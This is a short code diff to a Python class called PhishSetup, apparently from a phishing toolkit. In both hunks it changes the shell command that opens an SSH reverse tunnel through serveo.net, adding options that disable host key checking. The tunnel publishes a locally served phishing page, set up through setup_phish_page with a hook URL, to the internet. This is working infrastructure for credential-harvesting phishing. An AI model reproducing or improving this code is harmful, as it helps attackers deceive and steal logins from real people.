@@ -271,7 +271,7 @@ class PhishSetup:
             os.system("clear")
             key_name = self.sources.generate_ssh_key()
             os.system("clear")
-            command = f"ssh -i {key_name} -R 80:localhost:3000 serveo.net >> serveo_output.txt 2>&1&"
+            command = f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i {key_name} -R 80:localhost:3000 serveo.net >> serveo_output.txt 2>&1&"
             subprocess.run(command, shell=True)
             print(f"{RED}[--] Waiting for URl. Somethimes it may takes minutes due to slow internet issue or slow localhost.run server issue......{RESET}")
             while True:
@@ -301,7 +301,7 @@ class PhishSetup:
             self.phishcreate.setup_phish_page(hook_url)
             self.start_server()
             apache_port = self.sources.port_apache()
-            command = f"ssh -i {key_name} -R 80:localhost:{apache_port} serveo.net >> serveo_output.txt 2>&1&"
+            command = f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i {key_name} -R 80:localhost:{apache_port} serveo.net >> serveo_output.txt 2>&1&"
             subprocess.run(command, shell=True)
             print(f"{RED}[--] Waiting for URl. Somethimes it may takes minutes due to slow internet issue or slow localhost.run server issue......{RESET}")
             while True:
